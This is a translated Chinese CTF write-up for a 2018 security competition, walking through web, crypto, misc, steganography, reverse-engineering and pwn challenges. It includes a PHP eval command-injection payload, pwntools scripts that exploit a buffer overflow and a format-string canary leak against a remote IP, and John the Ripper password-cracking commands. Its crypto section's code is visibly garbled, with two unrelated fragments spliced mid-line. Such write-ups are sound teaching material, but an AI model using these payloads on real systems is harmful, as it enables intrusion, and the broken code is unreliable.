# 2018开源聚合杯网络空间安全大赛部分题目writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
随着网络安全受到持续性关注，攻防演练和攻防成为热点，全国各类不同规模攻防演练的激增，由华安普特与京东安全赞助的开源聚合杯网络空间安全大赛于5月落下帷幕。今天以CTF中各个题型的部分赛题为例，详解打CTF的心里路程与解题思路。其中包含web、隐写、逆向、pwn等多题型。
## WEB
###  旗帜变量
**题目描述**  
flag真的在变量里哦  
答题地址：  
**解析思路**  
利用超全局变量GLOBALS  
访问首页直接能获取到源代码  
此题目考察的是全局变量以及var_dump的问题。我们发现代码中利用正则表达式过滤了大部分可以执行的部分，但是最终args变量带入到了var_dump中，我们可以显示其中的内容。想到了flag变量是被包含进来的，我们可以用GLOBAL变量将其显示，于是最终访问：  
获得flag{92853051ab894a64f7865cf3c2128b34}
###  显示问题
**题目描述**  
显示内容很丰富哦  
答题地址：
**解析思路**  
本题目看似与上一个题目相同，但是我们发现其中少了一个$符号，也就是不存在变量名覆盖的问题，我们也就不能够直接定义一个GLOBAL变量来显示flag了。只能另想办法。  
这里想到可以利用双引号的闭合然后利用eval进行命令注入。  
于是传入payload：?hello=1);echo `cat flag.php`;//
成功获得flag  
记得要查看源代码中才能够看到注释了的flag哦
## CRYPTO
###  交换密钥
**题目描述**  
请找到正确的密钥并以格式：flag{a,b}形式提交  
提示：有很多可能性，其中我们需要找到最大的匹配答案提交，并且a和b都小于1000  
flag{710,808}
**解析思路**  
在这个题目中，我们需要解决的是小密钥的Diffe-hellman的密钥交换破解问题，正如题目中给出的密钥交换算法中的描述：  
图中展示的是两个人交换密钥的一些参数，我们现在就是一个中间人，截取到了他们两个密钥交换的中间参数。按照Diffie-Hellman的描述，我们只获取中间的参数也就是ga和gb是无法直接求出最终密钥gab的。不过这个题目中给出的参数都很小，我们可以根据题目提示，最大的一组参数暴力破解得到a和b  
代码如下：
    import numpy as np
    q=541
    g=10
    alist=[]
    aplus=[]
    gaplus=[]
    for a in range(1,1000,1):
      if(a mid and mid ** n > x:
                high = mid
            else:
                return mid
        return mid + 1
    def chinese_remainder(n, a):
        sum = 0
        prod = reduce(lambda a, b: a * b, n)
        for n_i, a_i in zip(n, a):
            p = prod / n_i
            sum += a_i * mul_inv(p, n_i) * p
        return sum % prod
    def mul_inv(a, b):
        b0 = b
        x0, x1 = 0, 1
        if b == 1: return 1
        while a > 1:
            q = a / b
            a, b = b, a % b
            x0, x1 = x1 - q * x0, x0
        if x1  test_passwd命令创建简单的连接文件。  
使用命令：john —wordlist=/usr/share/john/password.lst test_passwd进行密码破解  
使用命令：john —show test_passwd查看破解结果  
那么破解了gohan用户密码为dragon1，也就是flag
###  签到题
**题目描述**  
抓到了木马文件，但是被杀毒软件查杀了。请恢复签名，并找到ftp传送的文件。
**解析思路**  
这是个签名被破坏了的数据包文件，但是不妨碍直接提取字符串。  
使用strings（linux下）直接提取字符串,并用grep搜索flag  
得出flag{roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill}
## STEGA
###  夺旗赛
**题目描述**  
旗帜既是flag，答案格式flag{xxx}  
**解析思路**
题目给出的影片其实需要搜索的部分是静态部分的画面，我们通过FFmpeg命令将其转换为一帧的静态图片：  
根据提示，需要观察其中的旗子，通过stegsolve发现其实像素中有不同  
根据黑色为“0”，白色为“1”提取得到一串二进制：  
01100110 01101100 01100001 01100111 01111011 01010011 01110100 01100101
01100111 00110000 01011111 01100110 00110001 01000001 01100111 01011111
01001111 01001011 00100001 01111101  
在线转换为字符得到：  
flag{Steg0_f1Ag_OK!}
###  大脑切片
**题目描述**  
这种透明的图片就是看得人脑壳疼…  
答案格式：flag{xxx}
**解析思路**  
图片是一张带有透明度的图片，并且颜色分布无规律的马赛克  
利用alpha.py脚本将alpha通道提取并且根据颜色（rgb，都是16的倍数）进行排序，并当做ascii码转换为字符串，去除小写字母和0后得到一串明文  
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.++++++.—————-.++++++.++++++++++++++++++++.——.——————————————————————————————————.++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++++++.—————————-.+++++++++++++++++++++.——————.——————————————————————————-.++++++++++++++++++++++++++++++++++++++++++++.+++++++++.————————————————————————————.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++..+++.++++++++.————————————.++++++++++++++.—————————————————————————————.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++.  
利用brainfuck解密得到flag{w3_r_th3_h0llow_m3n}
## REVERSE
###  注册码
**题目描述**  
注册人flagshop,请找到flagshop的注册码。  
flag格式：flag{xxx}
**解析思路**  
IDA中通过shift+f12搜索字符串，找到“密钥无效”等中文信息：  
找到调用函数：  
其中验证函数使用的是sub_4011d0  
继续跟进，发现了如下逻辑：  
注册码是通过我们输入用户名得到的，而且开头会加上Happy@  
所以我们写出逆算法
    str='flagshop'
    flag = 'Happy@'
    for i in range(len(str)):
        flag+=chr((i+i*ord(str[i])*ord(str[i]))%66+33)
    print flag
Flag:flag{ Happy@!R+3G@-D}
## PWN
###  你知道BOF吗？
**题目描述**  
nc 202.98.28.108 9897
**解析思路**
    from pwn import *
    useless = 0xABCD1234
    offset = 40
    payload = "A" * offset + p32(0xABCD1234)
    r = remote('202.98.28.108',9897)
    r.sendline(payload)
    r.interactive()
得出flag{what_1s_BOF_you_know_now}
###  我的字符串
**题目描述**  
nc 202.98.28.108 9896
**解析思路**
带有canary保护，需要先利用printf格式化字符串漏洞获取保护值，再次覆盖地址：
    from pwn import *
    r = remote('202.98.28.108',9896)
    func = 0x0804854d
    r.sendline('%15$x')
    canary = int(r.recv(), 16)
    payload = 'A'*40 + p32(canary) + 'B'*12 + p32(func)
    r.sendline(payload)
    r.interactive()
得到flag{fmt_really_good_for_PWN}
锵锵锵，以上是大致解题的思路与过程，欢迎大家交流！